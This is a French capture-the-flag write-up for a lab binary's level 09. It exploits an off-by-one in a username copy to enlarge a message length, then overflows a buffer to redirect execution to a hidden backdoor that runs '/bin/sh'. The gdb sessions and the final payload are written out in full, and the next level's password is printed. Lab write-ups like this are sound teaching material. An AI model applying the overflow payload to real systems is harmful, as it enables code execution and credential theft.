# Level 09

Quand on lance le programme, il nous demande un username et un message à envoyer.

En examinant le code on peut voir qu'il y a une structure contenant, l'`username` de 40 charactères, un `message` de 140 char, et un `message_len` ainsi qu'une fonction `secret_backdoor` qui get une commande et l'execute avec la fonction système.

Notre but est donc d'appeler la fonction `secret_backdoor`. Lors de la copie de l'username entré par l'utilisateur vers la variable de la structure, on peut voir qu'il copie 41 char au lieu de 40 ce qui nous permet de réecrire la variable `message_len` avec la valeur que nous voulons.

La variable `message` est un tableau de 140, notre message entrer dans stdin sera copier avec un strncpy de la taille `message_len`.

```c
strncpy(struct->message, buffer, struct->message_len);
```

En mettant une valeur plus grande dans la variable `message_len`, nous pouvons ainsi réecrire l'EIP et ainsi appeller notre fonction `secret_backdoor`.

```shell
~ gdb level09
(gdb) info func
All defined functions:

Non-debugging symbols:
[...]
0x000055555555488c  secret_backdoor
0x00005555555548c0  handle_msg
0x0000555555554932  set_msg
0x00005555555549cd  set_username
0x0000555555554aa8  main
(gdb) shell python -c 'print "B"*40 + "\xff" + "\n"' > /tmp/level09
(gdb) r < /tmp/level09
Starting program: /home/users/level09/level09 < /tmp/level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
>>: >: Msg sent!
Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
(gdb) shell python -c 'print "B"*40 + "\xff" + "\n" + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz"' > /tmp/level09
(gdb) r < /tmp/level09
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level09/level09 < /tmp/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
>>: >: Msg sent!
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) info registers
rax            0xd	13
rbx            0x0	0
rcx            0x7ffff7b01f90	140737348902800
rdx            0x7ffff7dd5a90	140737351867024
rsi            0x7ffff7ff7000	140737354100736
rdi            0xffffffff	4294967295
rbp            0x7878787877777777	0x7878787877777777
[...]
(gdb) shell echo -n "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxx" | wc -c
200
```

L'offest est donc de 200 pour réecrire l'`RIP`

```shell
~ python -c 'print "B"*40 + "\xff" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "/bin/sh"' > /tmp/level09
~ cat /tmp/level09 - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBu
```

